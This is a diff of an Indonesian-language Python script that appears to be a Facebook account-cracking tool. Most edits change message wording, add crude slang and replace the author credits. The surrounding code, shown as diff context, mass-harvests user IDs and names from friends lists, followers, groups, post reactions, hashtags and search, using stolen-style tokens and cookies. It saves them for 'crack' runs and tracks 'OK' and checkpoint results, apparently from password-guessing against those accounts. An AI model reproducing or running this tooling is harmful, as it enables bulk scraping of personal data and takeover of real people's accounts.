@@ -45,15 +45,15 @@ except:
 
 def hasil(ok,cp):
 	if len(ok) != 0 or len(cp) != 0:
-		print("\n\n %s[%s✓%s] Crack selesai..."%(N,O,N))
-		print(f"\n\n\n %s[%s*%s] Total OK : %s{len(ok)}"%(N,H,N,H))
-		exit(f" %s[%s*%s] Total CP :%s {len(cp)}"%(N,K,N,K))
+		print("\n\n %s[%s#%s] crack selesai..."%(N,O,N))
+		print(f"\n\n\n %s[%s✓%s] total ok : %s{len(ok)}"%(N,H,N,H))
+		exit(f" %s[%s×%s] total cp :%s {len(cp)}"%(N,K,N,K))
 	else:exit("\n\n %s[%s!%s] opshh kamu tidak mendapatkan hasil:( "%(N,M,N))
 
 def tod():
     titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
     for x in titik:
-        print(f"\r %s[%s×%s] Menghapus Cookies {x} "%(N,M,N),end="")
+        print(f"\r %s[%s×%s] menghapus cookies {x} "%(N,M,N),end="")
         waktu(1)
 
 def ngentod():
@@ -105,22 +105,25 @@ def logo():
 def info_tools():
     os.system('clear')
     print( ' %s[%s#%s]'%(N,O,N)), 52 * '\x1b[1;96m-\x1b[0m';waktu(0.07)
-    print( '\n %s[%s*%s] Author   : Roy Octa Firdaus'%(N,H,N));waktu(0.07)
-    print( '\n %s[%s*%s] Code by  : Yayan-XD'%(N,H,N));waktu(0.07)
-    print( '\n %s[%s*%s] Github   : Private'%(N,H,N));waktu(0.07)
-    print( '\n %s[%s*%s] Facebook : https://www.facebook.com/JbFbOld'%(N,H,N));waktu(0.07)
+    print( '\n %s[%s>%s] Yt       : Yayan XD.'%(N,H,N));waktu(0.07)
+    print( '\n %s[%s>%s] Author   : Moch Yayan Juan Alvredo XD.'%(N,H,N));waktu(0.07)
+    print( '\n %s[%s>%s] Github   : https://github.com/Yayan-XD'%(N,H,N));waktu(0.07)
+    print( '\n %s[%s>%s] Facebook : https://www.facebook.com/KM39453'%(N,H,N));waktu(0.07)
+    print( '\n %s[%s>%s] Fanspage : https://www.facebook.com/Yayanxyz'%(N,H,N));waktu(0.07)
+    print( '\n %s[%s>%s] Instagram: https://www.instagram.com/yayanxd_'%(N,H,N));waktu(0.07)
+    print( '\n %s[%s>%s] Blogspot : https://squadcyberpeopleteam.blogspot.com'%(N,H,N));waktu(0.07)
     print( '\n %s[%s#%s]'%(N,O,N)), 52 * '\x1b[1;96m-\x1b[0m';waktu(0.07)
     input(' [ %sKEMBALI%s ] '%(O,N))
     ngewe().menu()
     
 def dump_id():
-	print ('\n [%s1%s]. Dump ID dari Teman Publik'%(O,N))
-	print (' [%s2%s]. Dump ID dari Total Followers'%(O,N))
-	print (' [%s3%s]. Dump ID dari Like Postingan'%(O,N))
+	print ('\n [%s1%s]. Dump id dari teman publik'%(O,N))
+	print (' [%s2%s]. Dump id dari total followers'%(O,N))
+	print (' [%s3%s]. Dump id dari like postingan'%(O,N))
 	__ngontol__()
 	
 def __ngontol__():
-	tod = input('\n %s[%s*%s] Menu : '%(N,O,N))
+	tod = input('\n [*] menu : ')
 	if tod == '':
 		print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);__ngontol__()
 	elif tod =='1':
@@ -130,7 +133,7 @@ def __ngontol__():
 	elif tod =='3':
 		postingan()
 	else:
-		print('\n %s[%s×%s] Isi yang benar'%(N,M,N));waktu(1);__ngontol__()
+		print('\n %s[%s×%s] isi yang bener'%(N,M,N));waktu(1);__ngontol__()
 
 # ---- Method Token --->
 
@@ -139,7 +142,7 @@ def teman():
     try:
         __cindy__= open('__yayan__.txt', 'r').read()
     except IOError:
-        print ('\n %s[%s!%s] Token Invalid'%(N,M,N))
+        print ('\n %s[%s!%s] token invalid'%(N,M,N))
         os.system('rm -rf __yayan__.txt')
         waktu(0.01)
         yayanxd()
@@ -147,9 +150,9 @@ def teman():
         os.mkdir('dump')
     except:pass
     try:
-        print (f"\n {N}[{M}!{N}] Isi 'me' jika ingin Dump ID dari daftar teman")
-        asw = input('\n %s[%s?%s] ID Publik  : '%(N,O,N))
-        mmk = input(' %s[%s?%s] Nama File  : '%(N,O,N))
+        print (f"\n {N}[{M}!{N}] isi 'me' jika ingin dump id dari daftar teman")
+        asw = input('\n %s[%s?%s] id publik  : '%(N,O,N))
+        mmk = input(' %s[%s?%s] nama file  : '%(N,O,N))
         ihh = req.get('https://graph.facebook.com/%s/friends?limit=50000000&access_token=%s'%(asw,__cindy__))
         id = []
         z = json.loads(ihh.text)
@@ -159,19 +162,19 @@ def teman():
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
-            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump ID...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
+            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             waktu(0.0050)
 
         ys.close()
-        jalan('\n\n %s[%s✓%s] Berhasil Dump ID'%(N,H,N))
-        print (' [%s•%s] Salin Output File 👉 ( %s%s%s )'%(O,N,M,cin,N))
+        jalan('\n\n %s[%s✓%s] berhasil dump id'%(N,H,N))
+        print (' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N))
         print( 50 * '=')
         input(' [%s ENTER%s ] '%(O,N))
         ngewe().menu()
     except (KeyError,IOError):
         os.remove(cin)
-        jalan('\n %s[%s!%s] Gagal Dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         input(' [ %sKEMBALI%s ] '%(O,N))
         ngewe().menu()
         
@@ -180,7 +183,7 @@ def followers():
     try:
         __cindy__= open('__yayan__.txt', 'r').read()
     except IOError:
-        print ('\n %s[%s×%s] Token Invalid'%(N,M,N))
+        print ('\n %s[%s×%s] token invalid'%(N,M,N))
         os.system('rm -rf __yayan__.txt')
         waktu(0.01)
         yayanxd()
@@ -188,8 +191,8 @@ def followers():
         os.mkdir('dump')
     except:pass
     try:
-        asw = input(' %s[%s?%s] ID Followers  : '%(N,O,N))
-        mmk = input(' %s[%s?%s] Nama File     : '%(N,O,N))
+        asw = input(' %s[%s?%s] id followers  : '%(N,O,N))
+        mmk = input(' %s[%s?%s] nama file     : '%(N,O,N))
         ihh = req.get('https://graph.facebook.com/%s/subscribers?limit=5000000000&access_token=%s'%(asw,__cindy__))
         id = []
         z = json.loads(ihh.text)
@@ -199,19 +202,19 @@ def followers():
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
-            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump ID...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
+            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             waktu(0.0050)
 
         ys.close()
-        jalan('\n\n %s[%s✓%s] Berhasil Dump ID'%(N,H,N))
-        print (' [%s•%s] Salin Output File 👉 ( %s%s%s )'%(O,N,M,cin,N))
+        jalan('\n\n %s[%s✓%s] berhasil dump id'%(N,H,N))
+        print (' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N))
         print( 50 * '=')
         input(' [%s ENTER%s ] '%(O,N))
         ngewe().menu()
     except (KeyError,IOError):
         os.remove(cin)
-        jalan('\n %s[%s!%s] Gagal Dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         input(' [ %sKEMBALI%s ] '%(O,N))
         ngewe().menu()
         
@@ -220,7 +223,7 @@ def postingan():
     try:
         __cindy__= open('__yayan__.txt', 'r').read()
     except IOError:
-        print ('\n %s[%s×%s] Token Invalid'%(N,M,N))
+        print ('\n %s[%s×%s] token invalid'%(N,M,N))
         os.system('rm -rf __yayan__.txt')
         waktu(0.01)
         yayanxd()
@@ -228,8 +231,8 @@ def postingan():
         os.mkdir('dump')
     except:pass
     try:
-        asw = input(' %s[%s?%s] ID Followers  : '%(N,O,N))
-        mmk = input(' %s[%s?%s] Nama File     : '%(N,O,N))
+        asw = input(' %s[%s?%s] id followers  : '%(N,O,N))
+        mmk = input(' %s[%s?%s] nama file     : '%(N,O,N))
         ihh = req.get('https://graph.facebook.com/%s/likes?limit=5000000000000&access_token=%s'%(asw,__cindy__))
         id = []
         z = json.loads(ihh.text)
@@ -239,19 +242,19 @@ def postingan():
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
-            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump ID...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
+            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['id'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             waktu(0.0050)
 
         ys.close()
-        jalan('\n\n %s[%s✓%s] Berhasil Dump ID'%(N,H,N))
-        print (' [%s•%s] Salin Output File 👉 ( %s%s%s )'%(O,N,M,cin,N))
+        jalan('\n\n %s[%s✓%s] berhasil dump id'%(N,H,N))
+        print (' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N))
         print( 50 * '=')
         input(' [%s ENTER%s ] '%(O,N))
         ngewe().menu()
     except (KeyError,IOError):
         os.remove(cin)
-        jalan('\n %s[%s!%s] Gagal Dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         input(' [ %sKEMBALI%s ] '%(O,N))
         ngewe().menu()
         
@@ -262,7 +265,7 @@ class sunda:
 		try:
 			__kontol__ = open('__yayan__.txt','r').read()
 		except (KeyError, IOError,FileNotFoundError):
-			print('\n %s[%s×%s] Cookies Invalid'%(N,M,N));waktu(1)
+			print('\n %s[%s×%s] cookies invalid'%(N,M,N));waktu(1)
 			try:os.remove('cookies');os.remove('__yayan__.txt')
 			except:os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt')
 			yayanxd()
@@ -272,7 +275,7 @@ class sunda:
 			nama   = keluar['name']
 			idfb   = keluar['id']
 		except (KeyError, IOError,FileNotFoundError):
-			print('\n %s[%s×%s] Cookies Invalid'%(N,M,N));waktu(1)
+			print('\n %s[%s×%s] cookies invalid'%(N,M,N));waktu(1)
 			try:os.remove('cookies');os.remove('__yayan__.txt')
 			except:os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt')
 			yayanxd()
@@ -325,7 +328,7 @@ class ngewe:
 					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"<=>"+softek[1])
 				else:
 					self.id.append(softek[0]+"<=>"+softek[1])
-				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
+				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
 			if "Lihat Selengkapnya" in kontol:
 				self.folower(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
 		except:pass
@@ -339,7 +342,7 @@ class ngewe:
 					self.id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
 				else:
 					self.id.append(softek[0]+"<=>"+softek[1])
-				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
+				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
 			if "Lihat Selengkapnya" in kontol:
 				self.grup(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
 			else:
@@ -360,7 +363,7 @@ class ngewe:
 									continue
 								else:
 									self.id.append(d+"<=>"+c[1])
-							print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
+							print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
 					if "Lihat Postingan Lainnya" in a:
 						geh(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
 				geh(f"{self.url}/groups/"+re.search("id=(\\d*)",hencet).group(1))
@@ -376,7 +379,7 @@ class ngewe:
 					self.id.append(re.findall("id=(.*?)&amp;refid",softek[1])[0]+"<=>"+softek[2])
 				else:
 					self.id.append(re.findall("(.*?)\?refid=",softek[1])[0]+"<=>"+softek[2])
-				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
+				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
 				if len(self.id)==jum:
 					true=True
 					break
@@ -394,7 +397,7 @@ class ngewe:
 					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"<=>"+softek[1])
 				else:
 					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"<=>"+softek[1])
-				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
+				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
 			if "Lihat selengkapnya" in kontol:
 				self.teman(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
 		except:pass
@@ -408,7 +411,7 @@ class ngewe:
 					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"<=>"+softek[1])
 				else:
 					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"<=>"+softek[1])
-				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
+				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
 			if "Lihat Teman Lain" in kontol:
 				self.teman_dari_teman(self.url+parser(kontol,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
 		except:pass
@@ -425,7 +428,7 @@ class ngewe:
 						self.id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
 					else:
 						self.id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
-					print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
+					print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
 				if "Lihat Selengkapnya" in kontol:
 					self.reactpost(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
 		except:pass
@@ -454,7 +457,7 @@ class ngewe:
 							continue
 						else:
 							self.id.append(tol+"<=>"+softek[1])
-				print(f"\r [*] Sedang mengumpulkan {len(self.id)} ID... ",end="")
+				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
 				if len(self.id)==jum:
 					true=True
 					break
@@ -465,36 +468,36 @@ class ngewe:
 # menu
 	def menu(self):
 		sunda(self.url)
-		jembut = input(f"\n %s[%s?%s] Pilih : {warna}"%(N,K,N))
+		jembut = input(f"\n [❓] Pilih : {warna}")
 		if jembut in["1","01"]:
 			while True:
-				kontol = input(f" {N}[?] Masukan Nama Pencarian (Ex : roy): ")
+				kontol = input(f" {N}[?] masukan nama pencarian (cht : zuck): ")
 				if kontol in[""," "]:
-					print('\n %s[%s×%s] Jangan kosong...'%(N,M,N));waktu(1);self.menu()
+					print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
 				else:
 					try:
 						ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=kueh).text
 						if "Maaf, kami tidak menemukan" in ajg:
-							print(f" [!] Pengguna dengan nama {kontol} tidak ditemukan");waktu(2);self.menu()
+							print(f" [!] pengguna dengan nama {kontol} tidak ditemukan");waktu(2);self.menu()
 						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
-							print(" [!] Facebook membatasi setiap aktivitas, Akun Tumbal Limit, silahkan beralih akun");waktu(2);self.menu()
+							print(" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
 						else:
-							jumlah = int(input(" [?] Masukan jumlah ID : "))
-							print(" [!] Untuk berhenti tekan CTRL lalu tekan c di keyboard Anda.")
+							jumlah = int(input(" [?] masukan jumlah id : "))
+							print(" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
 							if "5000" in str(jumlah):
 								jumlah-=1
 							if jumlah<5001:
 								self.search(f"{self.url}/search/people/?q={kontol}",jumlah);break
-							else: exit("\n [!] Maksimal 5000")
+							else: exit("\n [!] max 5000 ajg gosah berlebihan")
 					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
 						exit("\n [!] Kesalahan Pada Koneksi")
 					except ValueError:
-						exit("\n [!] Isi yang benar")
+						exit("\n [!] isi yang bener ajg")
 		elif jembut in["2","02"]:
-			print (f"{N} [*] Isi 'me' jika ingin Crack dari Daftar Teman")
-			kontol = input(" [?] Masukan ID atau Username : ")
+			print (f"{N} [*] isi 'me' jika ingin crack dari daftar teman")
+			kontol = input(" [?] masukan id atau username : ")
 			if kontol in[""," "]:
-				print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
+				print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
 			elif kontol.isdigit():
 				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
 			else:
@@ -502,25 +505,25 @@ class ngewe:
 			try:
 				ajg=req.get(memek,cookies=kueh).text
 				if "Tidak Ada Teman Untuk Ditampilkan" in ajg:
-					print(f" [!] Daftar teman tidak di publikasikan");waktu(2);self.menu()
+					print(f" [!] daftar teman tidak di publikasikan");waktu(2);self.menu()
 				elif "Halaman yang Anda minta tidak ditemukan." in ajg:
-					print(f" [!] Pengguna dengan ID {kontol} tidak ditemukan");waktu(2);self.menu()
+					print(f" [!] pengguna dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
 				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
-					print(" [!] Facebook membatasi setiap aktivitas, Akun Tumbal Limit, silahkan beralih akun");waktu(2);self.menu()
+					print(" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
 				elif "Konten Tidak Ditemukan" in ajg:
-					print(f" [!] Pengguna Dengan ID {kontol} tidak ditemukan");waktu(2);self.menu()
+					print(f" [!] Pengguna Dengan Id {kontol} tidak ditemukan");waktu(2);self.menu()
 				elif kontol in["ME","Me","me"]:
 					self.teman(f"{self.url}/friends/center/friends/")
 				else:
 					#print(" [*] crack dari teman : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
-					print(" [!] Untuk berhenti tekan CTRL lalu tekan c di keyboard Anda.")
+					print(" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
 					self.teman_dari_teman(memek)
 			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
-				exit(" [!] Kesalahan pada koneksi")
+				exit(" [!] kesalahan pada koneksi")
 		elif jembut in["3","03"]:
-			kontol = input(f"{N} [?] Masukan ID atau Username Followers : ")
+			kontol = input(f"{N} [?] masukan id atau username followers : ")
 			if kontol in[""," "]:
-				print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
+				print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
 			elif kontol.isdigit():
 				memek=f"{self.url}/profile.php?id={kontol}&v=followers"
 			else:
@@ -528,22 +531,22 @@ class ngewe:
 			try:
 				ajg=req.get(memek,cookies=kueh).text
 				if "Halaman Tidak Ditemukan" in ajg:
-					print(f" [!] Penggunaan dengan ID {kontol} tidak ditemukan");waktu(2);self.menu()
+					print(f" [!] penggunaan dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
 				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
-					print(" [!] Facebook membatasi setiap aktivitas, Akun Tumbal Limit, silahkan beralih akun");waktu(2);self.menu()
+					print(" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
 				elif "Konten Tidak Ditemukan" in ajg:
-					print(f" [!] Penggunaan dengan ID {kontol} tidak ditemukan");waktu(2);self.menu()
+					print(f" [!] penggunaan dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
 				else:
-					print(" [*] Crack Total Followers dari : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
-					print(" [!] Untuk berhenti tekan CTRL lalu tekan c di keyboard Anda.")
+					print(" [*] crack total followers dari : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
+					print(" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
 					self.folower(memek)
 			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
-				exit(" [!] Kesalahan pada koneksi")
+				exit(" [!] kesalahan pada koneksi")
 		elif jembut in["4","04"]:
-			kontol = input(f"{N} [?] URL atau ID Postingan : ")
-			print(" [!] Untuk berhenti tekan CTRL lalu tekan c di keyboard Anda.")
+			kontol = input(f"{N} [?] url atau id postingan : ")
+			print(" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
 			if kontol in[""," "]:
-				print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
+				print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
 			elif kontol.isdigit():
 				memek=f"{self.url}/{kontol}"
 			elif "m.facebook.com" in kontol:
@@ -557,71 +560,71 @@ class ngewe:
 			try:
 				ajg=req.get(memek,cookies=kueh).text
 				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in ajg:
-					print(f" [!] Posting tidak ditemukan");waktu(2);self.menu()
+					print(f" [!] posting tidak ditemukan");waktu(2);self.menu()
 				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
-					print(" [!] Facebook membatasi setiap aktivitas, Akun Tumbal Limit, silahkan beralih akun");waktu(2);self.menu()
+					print(" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
 				else:
 					try:
 						kuntul=re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',ajg)[0].replace(";","&")
 						self.reactpost(f"{self.url}/ufi/reaction/profile/browser/{kuntul}")
 					except IndexError:
-						print(" [!] Error, Silahkan Masukkan ID/URL Postingan dengan benar");waktu(1);self.menu()
+						print(" [!] Error, Silahkan Masukkan Id/Url Postingan Dengan Benar");waktu(1);self.menu()
 			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
-				exit(" [!] Kesalahan pada koneksi")
+				exit(" [!] kesalahan pada koneksi")
 			except req.exceptions.MissingSchema:
-				print(f" [!] Why {memek}, Masukin URL Postingan dengan bener");waktu(3);self.menu()
+				print(f" [!] Why {memek} Mikir Dong Tolol, Masukin Url Postingan Yang Bener Ngentod");waktu(3);self.menu()
 		elif jembut in["5","05"]:
 			while True:
-				kontol = input(f"{N} [?] Masukkan ID Grup : ")
+				kontol = input(f"{N} [?] masukkan id grup : ")
 				if kontol in[""," "]:
-					print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
+					print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
 				else:
 					try:
 						ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=kueh).text
 						if "Halaman Tidak Ditemukan" in ajg:
-							print(f" [!] Group dengan ID {kontol} tidak ditemukan");waktu(2);self.menu()
+							print(f" [!] group dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
 						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
-							print(" [!] Facebook membatasi setiap aktivitas, Akun Tumbal Limit, silahkan beralih akun");waktu(2);self.menu()
+							print(" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
 						elif "Konten Tidak Ditemukan" in ajg:
-							print(f" [!] Group dengan ID {kontol} tidak ditemukan");waktu(2);self.menu()
+							print(f" [!] group dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
 						else:
-							print(" [*] Nama Group : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
-							print(" [!] Untuk berhenti tekan CTRL lalu tekan c di keyboard Anda.")
+							print(" [*] nama grup : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
+							print(" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
 							self.grup(f"{self.url}/browse/group/members/?id={kontol}");break
 					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
 						exit(" [!] Kesalahan Pada Koneksi")
 		elif jembut in["6","06"]:
 			while True:
-				kontol = input(f"{N} [?] Hastag : ")
+				kontol = input(f"{N} [?] hastag : ")
 				if kontol in[""," "]:
-					print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
+					print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
 				else:
 					try:
 						ajg=req.get(f"{self.url}/hashtag/{kontol}",cookies=kueh).text
 						if "Halaman Tidak Ditemukan" in ajg or "Halaman yang Anda minta tidak ditemukan." in ajg:
-							print(f" [!] Hashtag {kontol} tidak ditemukan");waktu(2);self.menu()
+							print(f" [!] hashtag {kontol} tidak ditemukan");waktu(2);self.menu()
 						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
-							print(" [!] Facebook membatasi setiap aktivitas, Akun Tumbal Limit, silahkan beralih akun");waktu(2);self.menu()
-						elif "Sementara disembunyikan di sini. Beberapa konten di dalam postingan tersebut melanggar Standar Komunitas kami." in ajg:
-							print(f" [!] Postingan dengan Hashtag {kontol} disembunyikan karna melanggar standar komunitas facebook");waktu(2);self.menu()
+							print(" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
+						elif "sementara disembunyikan di sini. Beberapa konten di dalam postingan tersebut melanggar Standar Komunitas kami." in ajg:
+							print(f" [!] postingan dengan hashtag {kontol} disembunyikan karna melanggar standar komunitas facebook");waktu(2);self.menu()
 						else:
-							jumlah=int(input(" [?] Masukan Jumlah ID : "))
-							print(" [!] Untuk berhenti tekan CTRL lalu tekan c di keyboard Anda.")
+							jumlah=int(input(" [?] masukan jumlah id : "))
+							print(" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
 							if "5000" in str(jumlah):
 								jumlah-=1
 							if jumlah<5001:
 								self.hastag(f"{self.url}/hashtag/{kontol}",jumlah);break
-							else: exit("\n [!] Maksimal 5000")
+							else: exit("\n [!] max 5000 ajg gosah berlebihan")
 					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
-						exit(" [!] Kesalahan pada koneksi")
+						exit(" [!] kesalahan pada koneksi")
 					except ValueError:
-						exit(" [!] Isi yang bener")
+						exit(" [!] isi yang bener ajg")
 		elif jembut in["7","07"]:
 			print("\n %s[%s1%s] Check hasil OK"%(N,O,N))
 			print(" %s[%s2%s] Check hasil CP"%(N,O,N))
-			ask=input("\n %s[%s?%s] Pilih : "%(N,K,N))
+			ask=input("\n %s[%s?%s] Choose : "%(N,K,N))
 			if ask in[""," "]: 
-				print(" %s[%s!%s] Pilih yang benar"%(N,M,N));self.menu()
+				print(" [!] pilih yang bener ajg");self.menu()
 			elif ask in["1","01"]:
 				try:
 					totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
@@ -631,7 +634,7 @@ class ngewe:
 					print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
 					input('\n  [ %sKEMBALI%s ] '%(O,N));self.menu()
 				except (IOError):
-					print("\n %s[%s×%s] Opshh kamu tidak mendapatkan hasil OK :("%(N,M,N))
+					print("\n %s[%s×%s] Opshh kamu tidak mendapatkan hasil ok :("%(N,M,N))
 					input('\n  [ %sKEMBALI%s ] '%(O,N));self.menu()
 			elif ask in["2","02"]:
 				try:
@@ -642,69 +645,69 @@ class ngewe:
 					print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
 					input('\n  [ %sKEMBALI%s ] '%(O,N));self.menu()
 				except (IOError):
-					print("\n %s[%s×%s] Opshh kamu tidak mendapatkan hasil CP :("%(N,M,N))
+					print("\n %s[%s×%s] Opshh kamu tidak mendapatkan hasil cp :("%(N,M,N))
 					input('\n  [ %sKEMBALI%s ] '%(O,N));self.menu()
 			else:
-				print(" %s[%s!%s] Pilih yang benar"%(N,M,N));self.menu()
+				print(" [!] pilih yang bener ajg");self.menu()
 		elif jembut in["8","08"]:
 			info_tools()
 		elif jembut in["9","09"]:
 			dump_id()
 		elif jembut in["10"]:
